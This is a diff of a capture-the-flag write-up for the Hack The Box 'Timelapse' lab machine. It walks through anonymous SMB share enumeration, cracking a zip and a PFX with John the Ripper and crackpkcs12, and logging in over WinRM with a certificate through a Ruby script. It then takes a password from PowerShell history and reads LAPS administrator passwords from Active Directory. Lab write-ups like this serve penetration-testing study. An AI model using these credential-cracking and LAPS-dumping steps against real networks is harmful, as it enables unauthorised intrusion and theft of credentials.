@@ -116,14 +116,15 @@ SMB has always proved some-what reliable for me during enumeration phases. I use
 I use smbmap to discover network shares avaialble to be as 'Guest' or 'anonymous' access.
 
 ```
-smbmap -H 10.10.11.152 -u Guest -p ""
+smbmap -H 10.10.11.152 -u Guest -p "" -R
 ```
 
 * **-H:** Host / IP Address
 * **-u:** User
 * **-p:** Password
+* **-R:** Recursive
 
-![](<../../.gitbook/assets/image (15).png>)
+![](<../../.gitbook/assets/image (15) (1).png>)
 
 The results provide us with access to files under the \Shares\Dev & \Shares\Helpdesk.
 
@@ -144,13 +145,13 @@ get LAPS_OperationsGuide.docx
 get TechnicalSpecification.docx
 ```
 
-![](<../../.gitbook/assets/image (34).png>)
+![](<../../.gitbook/assets/image (34) (1).png>)
 
-![](<../../.gitbook/assets/image (7).png>)
+![](<../../.gitbook/assets/image (7) (1).png>)
 
 ZIP file is protected with a password but the contents show a PFX.
 
-![](<../../.gitbook/assets/image (35).png>)
+![](<../../.gitbook/assets/image (35) (1).png>)
 
 I used a couple of tools to crack the .zip and then the PFX, mainly John-The-Ripper.
 
@@ -162,7 +163,7 @@ zip2john winrm_backup.zip > zip-hash.txt
 
 * zip2john \<file.zip> > \<hash file output>
 
-![](<../../.gitbook/assets/image (26).png>)
+![](<../../.gitbook/assets/image (26) (1).png>)
 
 Cracking the hash with John-The-Ripper.
 
@@ -173,7 +174,7 @@ john --wordlist=/usr/share/wordlist/rockyou.txt zip-hash.txt
 * **John:** John-The-Ripper
 * **--wordlist=:** Wordlist location / Wordlist to use - Rockyou.txt
 
-![](<../../.gitbook/assets/image (36).png>)
+![](<../../.gitbook/assets/image (37).png>)
 
 Using the password from the .zip, I can now extract the PFX file.
 
@@ -190,10 +191,125 @@ crackpkcs12 -d /usr/share/wordlist/rockyou.txt legacyy_dev_auth.pfx -v
 * **-d:** Dictionary Wordlist
 * **-v:** Verbose mode
 
-![](<../../.gitbook/assets/image (4).png>)
+![](<../../.gitbook/assets/image (33).png>)
 
 Given the name of the certificate, I have made a note that these are potential credentials:
 
 * Username: legacyy
-* Password: thuglegacy
+* Password: #####
+
+### WINRM
+
+Knowing that WINRM uses Certificate-based authentication. I need to extract the certificate & the key from the PFX file. For this, I use openssl
+
+```
+#Extracting the private key
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev.key
+
+#Extracting the certificate
+openssl pkcs12 -in  legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev.cer
+```
+
+Whilst extracting the key & cert, it will prompt for the password of the PFX.
+
+Whilst extracting the key, it will request to supply a new PEM pass phrase. (Yes there is a typo in my file names)
+
+![](<../../.gitbook/assets/image (26).png>)
+
+![](<../../.gitbook/assets/image (15).png>)
+
+Attempting to connect over WINRM failed for me when trying to use evil-winrm. I secured a Ruby script from [https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm) to edit.
+
+Here is part of the Ruby script and the changes added in.
+
+```
+require 'winrm-fs'
+
+# Author: Alamot
+# To upload a file type: UPLOAD local_path remote_path
+# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
+
+
+conn = WinRM::Connection.new( 
+  endpoint: 'https://10.10.11.152:5986/wsman', #Configure for Timelapse IP:5986/WSMAN
+  transport: :ssl,
+  user: 'legacyy', #Username
+  password: '####', #Password
+  :client_cert => '/home/kali/htb/Timelapse/legacyy_dev.cer', #Added in for Certificate Auth
+  :client_key => '/home/kali/htb/Timelapse/legacyy_dev.key', #Added in for Certificate Auth
+  :no_ssl_peer_verification => true
+)
+```
+
+![](<../../.gitbook/assets/image (5).png>)
+
+### Foothold - WinRM
+
+![](<../../.gitbook/assets/image (7).png>)
+
+Now that I'm in, time for further enumeration.
+
+I check what users are present in C:\Users.
+
+![](<../../.gitbook/assets/image (17).png>)
+
+* **Administrator**
+* **Legacyy (current)**
+* **Public**
+* **svc\_deploy**
+* **TRX**
+
+I get access denied to all of these profiles.
+
+#### **TL:DR**
+
+After some thorough enumeration, I come across the ConsoleHost\_history.txt file under Legacyy's profile.
+
+![](<../../.gitbook/assets/image (34).png>)
+
+The screenshot above shows that legaccy is attempting to invoke a command on the localhost under a different user account (svc\_deploy). The variable $p provides the password in clear text.
+
+I copy and paste the output and edit my Ruby script with the new credentials and hash out the certificate requirements
+
+![](<../../.gitbook/assets/image (8).png>)
+
+![](<../../.gitbook/assets/image (31).png>)
+
+### Privilege Escalation
+
+Using svc\_deploy I am able to perform Powershell queries for AD attributes. Things I want to identify are Domain Group memberships and Computer objects.
+
+```
+Get-ADUser -Filter * -Properties * | Select Name, MemberOf
+Get-ADComputer -Filter * | Select Name, Enabled, SamAccountName
+```
+
+![](<../../.gitbook/assets/image (35).png>)
+
+![](<../../.gitbook/assets/image (6).png>)
+
+* **Administrator:** Domain Admins, Enterprise Admins, Schema Admins
+* **Guest:** Not interested
+* **krbtgt:** Standard Stuff
+* **TheCyberGeek:** Domain Admin
+* **Sinfulz:** Helpdesk
+* **Babywyrm:** Helpdesk
+* **svc\_deloy:** LAPS\_Reader
+* **TRX:** Domain Admin
+
+svcdeploy has membership in LAPS\_Readers. if you're unfamiliar with this, This means that svc\_deploy can read the Local Administrators password on devices where LAPS is configured.
+
+```
+Get-ADComputer -Filter * -Properties * | Select Name, ms-Mcs-AdmPwd
+```
+
+* **ms-Mcs-AdmPwd:** This is the AD Attribute where the password is stored.
+
+![](<../../.gitbook/assets/image (25).png>)
+
+Now I have the Administrators password, time to go back and reconfigure my Ruby script.
+
+![](<../../.gitbook/assets/image (24).png>)
+
+I am now the administrator and get root.txt
 
